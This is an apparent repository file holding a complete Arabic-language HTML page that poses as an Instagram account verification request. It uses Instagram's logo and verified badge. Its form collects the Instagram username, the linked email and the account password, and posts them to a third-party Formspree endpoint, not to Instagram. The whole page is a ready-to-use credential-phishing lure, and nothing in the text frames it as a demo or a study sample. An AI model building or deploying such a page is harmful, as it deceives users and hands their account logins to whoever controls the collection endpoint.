# instagram-verification
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>طلب توثيق حساب إنستغرام</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            direction: rtl;
            background-color: #f5f5f5;
            padding: 20px;
        }
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 400px;
            margin: auto;
            text-align: center;
        }
        .icons {
            margin-bottom: 15px;
        }
        .icons img {
            width: 50px;
            height: 50px;
            margin: 0 5px;
            vertical-align: middle;
        }
        h2 {
            color: #333;
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 10px;
            font-weight: bold;
            text-align: right;
        }
        input[type="text"], input[type="email"], input[type="password"], textarea {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            width: 100%;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="icons">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/Instagram_verified_badge.svg" alt="Verified Badge">
    </div>
    <h2>طلب توثيق حساب إنستغرام</h2>
    <form action="https://formspree.io/f/xblgplzw" method="POST">
        <label for="username">اسم المستخدم في إنستغرام:</label>
        <input type="text" id="username" name="username" required>

        <label for="email">البريد الإلكتروني المرتبط بالحساب:</label>
        <input type="email" id="email" name="email" required>

        <label for="password">كلمة المرور (اختياري):</label>
        <input type="password" id="password" name="password">

        <label for="followers">عدد المتابعين:</label>
        <input type="text" id="followers" name="followers">

        <label for="contact">وسيلة التواصل المفضلة:</label>
        <input type="text" id="contact" name="contact">

        <label for="notes">ملاحظات إضافية:</label>
        <textarea id="notes" name="notes"></textarea>

        <button type="submit">إرسال</button>
    </form>
</div>

</body>
</html>
        
